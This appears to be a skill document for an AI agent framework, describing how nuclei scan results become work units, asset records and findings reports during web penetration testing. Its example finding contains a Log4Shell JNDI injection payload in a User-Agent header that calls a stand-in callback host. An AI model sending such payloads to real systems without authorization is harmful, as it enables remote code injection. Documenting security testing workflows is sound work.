# rupu wiring for the nuclei skill

Every parse/handoff step in this skill MUST end in one of three rupu-ingestible
outputs: a work-units JSON array file, `assets.mark` calls, or a
`findings.report` call. `scripts/parse_nuclei.py` emits all three shapes from
nuclei JSONL.

## 1. Work units (fan-out over matches needing confirmation)

A clean JSON ARRAY file whose first character is `[`. rupu's `for_each:`
JSON-parses a file value that begins with `[` (read via the `read_file` tool);
a lead agent reads the same file and `dispatch`es one child per element.
Generate with:

```sh
python3 scripts/parse_nuclei.py nuclei.jsonl --work-units units.json
```

Element shape (one per non-info match, deduped on template-id + matched-at):

```json
[
  {
    "id": "CVE-2021-44228:https-192-0-2-10-login",
    "title": "Apache Log4j2 Remote Code Injection",
    "targets": ["https://192.0.2.10/login"],
    "hints": {
      "severity": "critical",
      "cve": "CVE-2021-44228",
      "cwe": "CWE-917",
      "tags": "cve,rce,oast,log4j",
      "template_id": "CVE-2021-44228"
    }
  }
]
```

Hand the normalized array to the `work-units` skill (the canonical work-unit
splitter/normalizer) before fan-out; each child agent confirms its match
(re-run the single template with `-debug`, or replay `curl-command`) and then
files a finding.

## 2. Assets — `assets.mark`

Record every scanned site and every matched route with the rupu `assets.mark`
tool using the `web` profile kinds (profile-namespaced: prefix `web:`). Use the
`coverage-assets` skill for the mechanics. Depth ladder:
`mapped` -> `crawled` -> `tested` -> `exploited`. nuclei-scanned targets are
`tested`; bump a route to `exploited` once the match is manually confirmed /
leveraged.

Site (one per scanned base URL):

```json
{
  "kind": "web:site",
  "coordinates": [{"t": "url", "v": "https://192.0.2.10"}],
  "label": "https://192.0.2.10",
  "depth": "tested"
}
```

Route (one per matched-at URL):

```json
{
  "kind": "web:route",
  "coordinates": [
    {"t": "url", "v": "https://192.0.2.10"},
    {"t": "http_route", "v": "/login"}
  ],
  "label": "nuclei: CVE-2021-44228 @ /login",
  "depth": "tested"
}
```

`parse_nuclei.py --assets assets.json` writes an array of these payloads;
iterate it and call `assets.mark` once per element.

## 3. Findings — `findings.report`

File each CONFIRMED issue with the `findings.report` tool via the
`finding-report` skill. The `web` profile completeness checks require all three
of: the finding pinned to a route/url, an HTTP exchange in the evidence, and an
OWASP-or-CWE classification. nuclei JSONL supplies all three (`matched-at`,
`request`/`response`, `info.classification`).

- scope: `endpoint` with `target_ref` = the matched-at URL (use scope `host`
  only for host-wide issues such as a vulnerable server banner).
- severity: nuclei severity maps 1:1 (`info|low|medium|high|critical`;
  `unknown` -> `info`).
- evidence.rationale: weakness + the evidence establishing it (matcher that
  fired, extracted results, interactsh interaction if OOB).

```json
{
  "scope": "endpoint",
  "target_ref": "https://192.0.2.10/login",
  "title": "Apache Log4j2 Remote Code Injection (CVE-2021-44228)",
  "severity": "critical",
  "classification": "CWE-917",
  "evidence": {
    "rationale": "nuclei template CVE-2021-44228 confirmed JNDI injection: the User-Agent payload triggered a DNS interaction on the interactsh callback (matcher 'dns-interaction'), proving unauthenticated remote code injection via Log4j2 lookup evaluation.",
    "request": "GET /login HTTP/1.1\r\nHost: 192.0.2.10\r\nUser-Agent: ${jndi:ldap://caa1b2.oast.example.net/a}\r\n...",
    "response": "HTTP/1.1 200 OK\r\n..."
  },
  "references": [
    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
  ]
}
```

`parse_nuclei.py --findings findings.json` writes an array of these payloads
pre-filled from the JSONL (including the raw request/response when nuclei
recorded them). Workflow: confirm the corresponding work unit first, enrich the
rationale with what the confirmation showed, then call `findings.report` with
the payload. Info-severity tech-detect matches are NOT findings — they are
routing data for `cms-testing` / `tls-testing` / manual skills, and coverage
data for `assets.mark`.

## Step-by-step wiring summary

| Methodology step | rupu output |
|---|---|
| Full/tag/severity scan parsed | `--work-units units.json` -> `work-units` skill -> fan-out |
| Tech-detect scan parsed | `assets.mark` (`web:site`, depth `tested`) + routing decision |
| Any scan parsed | `--assets assets.json` -> `coverage-assets` skill |
| Work unit confirmed | `findings.report` via `finding-report` skill; bump route asset to `exploited` |
| Custom-template hit validated | same as above — the template IS the reproduction evidence |
